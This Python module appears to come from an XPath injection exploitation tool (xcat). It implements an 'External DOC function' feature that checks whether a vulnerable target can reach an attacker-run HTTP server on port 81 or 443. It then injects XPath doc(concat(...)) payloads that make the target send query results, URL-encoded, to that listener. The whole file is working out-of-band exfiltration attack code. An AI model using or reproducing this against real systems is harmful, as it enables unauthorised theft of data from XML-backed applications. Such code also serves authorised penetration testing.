import asyncio

import logbook

from . import BaseFeature
from ..xpath import doc, concat, encode_for_uri
from ..oob import http


logger = logbook.Logger("DocFeature")


class DocFeature(BaseFeature):
    NAME = "External DOC function"
    server = None  # Hack Hack: Set by xcat.py, todo: fix this

    def __init__(self, port=None):
        super().__init__()
        self.working_port = port

    def TEST(self):
        return [
            doc("{}/test".format(self.server.location)).add_path("/test") == http.OOBHttpRequestHandler.TEST_RESPONSE
        ]

    @asyncio.coroutine
    def is_available(self, requester):
        for port in (81, 443):
            yield from self.server.start(port=port)
            r = yield from super().is_available(requester)
            self.server.stop()
            if r:
                self.working_port = port
                return True

        return False

    @asyncio.coroutine
    def execute(self, requester, expression):
        return self.execute_many(requester, (expression,))

    @asyncio.coroutine
    def execute_many(self, requester, expressions):
        if not self.server.started:
            raise RuntimeError("DocFeature.execute() called when server is not started")

        identifier, future = self.server.expect_data()
        expressions = list(expressions)

        if len(expressions) == 0:
            return []

        yield from requester.send_payload(
            doc(concat("{}/{}?".format(self.server.location, identifier),
                       *[concat("d=", encode_for_uri(e), "&") for e in expressions]))
        )
        try:
            result = yield from asyncio.wait_for(future, 5)
        except asyncio.TimeoutError:
            #logger.error("5 second timeout expired waiting for doc() postback.")
            return None
        return result["d"]

